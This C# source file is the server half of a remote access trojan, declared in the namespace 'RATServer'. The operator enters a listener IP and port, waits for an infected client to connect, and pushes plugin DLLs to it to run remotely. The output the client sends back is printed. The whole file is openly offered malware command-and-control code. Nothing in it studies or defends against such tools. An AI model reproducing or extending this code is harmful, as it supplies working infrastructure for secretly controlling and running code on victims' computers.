using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;

namespace RATServer
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[Enter Listener IP]: ");
            string ip = Console.ReadLine();

            Console.Write("[Enter Listener Port]: ");
            int port = int.Parse(Console.ReadLine());

            StartServer(ip, port);
        }

        static void StartServer(string ip, int port)
        {
            TcpListener listener = new TcpListener(IPAddress.Parse(ip), port);
            listener.Start();
            Console.WriteLine("\n[Listener Started]: " + ip + ":" + port + " ");

            while (true)
            {
                Console.WriteLine("\n[Listening For Client]");
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("[Client Connected]");

                try
                {
                    while (client.Connected)
                    {
                        Console.Write("\n[Command]: ");
                        while (Console.KeyAvailable)
                        {
                            Console.ReadKey(true);
                        }
                        string cmdInput = Console.ReadLine();
                        if (cmdInput == "help")
                        {
                            Console.WriteLine("\nAvailable Plugins:");
                            string[] pluginFiles = Directory.GetFiles("Plugins", "*.dll");
                            foreach (string pluginFile in pluginFiles)
                            {
                                try
                                {
                                    Assembly assembly = Assembly.LoadFrom(pluginFile);
                                    AssemblyDescriptionAttribute descriptionAttribute = (AssemblyDescriptionAttribute)assembly.GetCustomAttribute(typeof(AssemblyDescriptionAttribute));
                                    Console.WriteLine("{0}: {1}", Path.GetFileNameWithoutExtension(pluginFile), descriptionAttribute.Description);
                                }
                                catch (Exception)
                                {
                                    Console.WriteLine("{0} Unable To Load Plugin.", Path.GetFileNameWithoutExtension(pluginFile));
                                }
                            }
                        }
                        else
                        {
                            // Load plugin assembly
                            Assembly assembly = Assembly.LoadFrom("Plugins\\" + cmdInput + ".dll");

                            // Send plugin assembly to client
                            byte[] assemblyBytes = File.ReadAllBytes("Plugins\\" + cmdInput + ".dll");
                            client.GetStream().Write(BitConverter.GetBytes(assemblyBytes.Length), 0, sizeof(int));
                            client.GetStream().Write(assemblyBytes, 0, assemblyBytes.Length);

                            // Read plugin output from client
                            byte[] buffer = new byte[1024];
                            int bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
                            string output = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                            Console.WriteLine(output);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("\n[Error]: " + e.Message);
                }
                finally
                {
                    client.Close();
                    Console.WriteLine("\n[Client disconnected]");
                }
            }
        }
    }
}